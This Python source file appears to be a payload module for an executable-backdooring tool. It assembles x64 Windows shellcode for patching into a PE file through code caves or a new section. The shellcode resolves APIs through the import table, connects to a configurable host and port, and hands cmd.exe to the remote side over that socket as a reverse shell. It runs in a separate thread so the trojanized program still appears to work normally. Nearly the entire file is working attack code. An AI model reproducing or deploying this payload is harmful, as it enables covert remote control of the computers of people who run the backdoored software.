import struct
import os
import logging
from core import enum
from core import support
logger = logging.getLogger(__name__)
from pe.core import eat_code_caves
from common import common

class iat_reverse_tcp_inline_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_reverse_tcp_inline_threaded"
        self.description = """Import Address Table reverse tcp shell threaded"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                            }

        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')

        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             , 'iso-8859-1')
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                                 b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'single'

    def invoke(self, PM):
        # Expose patching method objects

        self.PM = PM
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Complete IAT based payload includes spawning of thread.
        """

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                logger.error(f"API not found: {api}")
                return False
        #overloading the class stackpreserve

        #get_payload:  #Jump back with the address for the payload on the stack.
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"

        #Can inject any shellcode below.
        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 90

        self.shellcode2 += b"\xfc"                   # CLD
        self.shellcode2 += b"\x55\x48\x89\xE5"       # push rbp, mov rpp, rsp
        self.shellcode2 += b"\x48\x31\xD2"           # xor rdx, rdx
        self.shellcode2 += b"\x65\x48\x8B\x52\x60"   # mov rdx, QWORD ptr gs: [rdx+0x60]
        self.shellcode2 += b"\x48\x8B\x52\x10"       # mov rdx, Qword ptr [rdx + 10]
        # rdx now module entry
        self.shellcode2 += b"\x49\xBE"           # mov value below to r14

        if self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'])
        #RDX holds entry point
        self.shellcode2 += b"\x49\x01\xD6"  # add r14 + RDX
        self.shellcode2 += b"\x49\xBF"  # mov value below to r15
        if self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'])
        self.shellcode2 += b"\x49\x01\xD7"  # add r15 + RDX
        #LoadLibraryA in r14
        #GetProcAddress in r15

        '''
        Winx64 asm calling convention
        RCX, RDX, R8, R9 for the first four integer or pointer arguments (in that order),
        and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments
        are pushed onto the stack (right to left). Integer return values (similar to x86) are
        returned in RAX if 64 bits or less. Floating point return values are returned in XMM0.
        Parameters less than 64 bits long are not zero extended; the high bits are not zeroed.

        The caller reserves space on the stack (unlike x86)
        rbx
        rbp
        r12
        r13
        r14: LoadLibraryA
        r15: GetProcAddress

        '''

        self.shellcode2 += bytes("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"       # mov r11, ws2_32
                            "\x41\x53"                                       # push r11
                            "\x49\x89\xE3"                                   # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                   # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                   # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            , 'iso-8859-1')
        self.shellcode2 += struct.pack('!H', int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += bytes("\x57"                                           # push rdi
                            "\x48\x89\xE7"                                   # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                   # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xff\x16"                                   # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                   # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20

                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);

                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            "\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            "\x48\x81\xC4\xb8\x02\x00\x00"                   # add rsp, 0x2b8
                            , 'iso-8859-1'
                            )
        #socket is in r12

        self.shellcode2 += bytes("\xeb\x09"                                        # jump over kernel32
                            "\x6b\x65\x72\x6e\x65\x6c\x33\x32\x00"           # kernel32,00
                            "\x48\x8D\x0D\xF0\xFF\xFF\xFF"                   # lea rcx, [rip-4]
                            "\x48\x83\xEC\x20"                               # sub rsp, 20
                            "\x41\xFF\x16"                                   # call qword ptr [r14]
                            # getprocaddress CreateProcessA
                            "\x49\x89\xC5"                                   # mov r13, rax ; mov kernel32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0f"                                       # jump over CreateProcessA,0
                            "\x43\x72\x65\x61\x74\x65\x50"                   # CreateProcessA
                            "\x72\x6f\x63\x65\x73\x73\x41\x00"               # ...
                            "\x48\x8D\x15\xEA\xFF\xFF\xFF"                   # lea rdx, [rip - 22]
                            "\x48\x83\xEC\x20"                               # sub rsp, 20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr CreateProcessA
                            # CreateProcessesA in rax
                            "\x48\x89\xC7"                                   # mov rdi, rax ;mov CreateProcessA to rdi
                            "\x49\x87\xFC"                                   # xchg r12, rdi (socket handle for CreateProcessA)
                            # socket is in rdi
                            # shell:
                            "\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00"       # mov r8, 'cmd'
                            "\x41\x50"                                       # push r8                     ; an extra push for alignment
                            "\x41\x50"                                       # push r8                     ; push our command line: 'cmd',0
                            "\x48\x89\xe2"                                   # mov rdx, rsp                ; save a pointer to the command line
                            "\x57"                                           # push rdi                    ; our socket becomes the shells hStdError
                            "\x57"                                           # push rdi                    ; our socket becomes the shells hStdOutput
                            "\x57"                                           # push rdi                    ; our socket becomes the shells hStdInput
                            "\x4d\x31\xc0"                                   # xor r8, r8                  ; Clear r8 for all the NULL's we need to push
                            "\x6a\x0d"                                       # push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
                            "\x59"                                           # pop rcx                     ; Set RCX for the loop
                            # 1 push_loop:                    ;
                            "\x41\x50"                                       # push r8                     ; push a null qword
                            "\xe2\xfc"                                       # loop push_loop              ; keep looping untill we have pushed enough nulls
                            "\x66\xc7\x44\x24\x54\x01\x01"                   # mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
                            "\x48\x8d\x44\x24\x18"                           # lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
                            "\xc6\x00\x68"                                   # mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
                            "\x48\x89\xe6"                                   # mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure
                            #   ; 1 perform the call to CreateProcessA
                            "\x56"                                           # push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure
                            "\x50"                                           # push rax                    ; Push the pointer to the STARTUPINFO Structure
                            "\x41\x50"                                       # push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
                            "\x41\x50"                                       # push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
                            "\x41\x50"                                       # push r8                     ; We dont specify any dwCreationFlags
                            "\x49\xff\xc0"                                   # inc r8                      ; Increment r8 to be one
                            "\x41\x50"                                       # push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
                            "\x49\xff\xc8"                                   # dec r8                      ; Decrement r8 (third param) back down to zero
                            "\x4d\x89\xc1"                                   # mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                                                                             #                             ; r8 = lpProcessAttributes (NULL)
                                                                             #                             ; rdx = the lpCommandLine to point to "cmd",0
                            "\x4c\x89\xc1"                                   # mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
                            "\x48\x83\xEC\x20"                               # sub rsp, 20
                            "\x41\xFF\xD4"                                   # call r12                    ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
                            # perform the call to WaitForSingleObject
                            "\xeb\x14"                                       # jmp over WaitForSingleObject
                            "\x57\x61\x69\x74\x46\x6f\x72\x53"               # WaitForSingleObject
                            "\x69\x6e\x67\x6c\x65\x4f\x62\x6a"               # ...
                            "\x65\x63\x74\x00"                               # ...
                            "\x48\x8D\x15\xE5\xFF\xFF\xFF"                   # lea rdx, [rip-27]
                            "\x4C\x89\xE9"                                   # mov rcx, r13 ; mov kernel32 handle to rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WaitForSingleObject
                            # WaitForSingleObject is in rax
                            "\x48\x31\xd2"                                   # xor rdx, rdx
                            "\x48\xFF\xCA"                                   # dec rdx
                            "\x8b\x0e"                                       # mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD0"                                       # call rax; WaitForSingleObject( pi.hProcess, INFINITE );
                            #Fix Up rsp
                            #"\x48\x81\xC4\x08\x04\x00\x00"                   # add rsp, 0x408
                            , 'iso-8859-1')
                            # ADD EXITFUNC HERE THREAD
        #kernel32 handle in r13
        #LoadLibraryA in r14
        #GetProcAddress in r15
        # just try exitthread...
        self.shellcode2 += bytes("\xeb\x0b"
                            "\x47\x65\x74\x56\x65"
                            "\x72\x73\x69\x6f\x6e\x00"                  # GetVersion
                            "\x48\x8D\x15\xEE\xFF\xFF\xFF"              # lea rdx, [rip-16]
                            "\x4C\x89\xE9"                              # mov rcx, r13 ; mov kernel32 handle to rcx
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\x41\xFF\x17"                              # call qword ptr [r15] GetProcAddr GetVersion
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\xff\xd0"                                  # call rax (getversion)
                            "\x83\xf8\x06"                              # cmp al, 6
                            "\x7d\x19"                                  # jl short to ntdll
                            "\xeb\x0b"
                            "\x45\x78\x69\x74\x54"                      # ...
                            "\x68\x72\x65\x61\x64\x00"                  # ExitThread
                            "\x48\x8D\x15\xEE\xFF\xFF\xFF"              # lea rdx, [rip -16]
                            "\x4C\x89\xE9"                              # mov rcx, r13 ..add mov kernel32 to rcx
                            "\xeb\x34"                                  # jmp short to su rsp for getprocaddress
                            "\xeb\x06"                                  # jmp short over ntdll
                            "\x6e\x74\x64\x6c\x6c\x00"                      # ntdll
                            "\x48\x8D\x0D\xF3\xFF\xFF\xFF"              # lea rcx, [rip -13]
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\x41\xff\x16"                              # call qword ptr [r14] LoadlibA ntdll
                            "\x48\x89\xc1"                              # mov rcx, rax
                            "\xeb\x12"                                  # jmp over RtlExitUserThread
                            "\x52\x74\x6c\x45\x78\x69\x74\x55\x73"      # RtlExitUserThread
                            "\x65\x72\x54\x68\x72\x65\x61\x64\x00"      # ...
                            "\x48\x8D\x15\xE7\xFF\xFF\xFF"              # lea rdx, [rip -16]
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\x41\xFF\x17"                              # call qword ptr [r15] GetProcAddr RtlExitUserThread or ExitThread
                            "\x48\x31\xc9"                              # xor rcx, rcx
                            "\xff\xd0"                                  # call rax
                            , 'iso-8859-1')
        #Virtual ALLOC Code BELOW

        

        self.shellcode1 = bytes("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to iterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               #; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               #; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               # ; We now automagically return to the correct caller...
                           #get_next_mod: ;
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           #get_next_mod1: ;
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           , 'iso-8859-1')
        #allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += bytes("\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            , 'iso-8859-1')
                            ##mov rcx, 0x1ab
        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x43"

                            # got_payload:
        self.shellcode1 += bytes("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"  # xor rax,rax

                            "\x50"                                  # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      # add rsp, 50

                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            , 'iso-8859-1')

        breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2

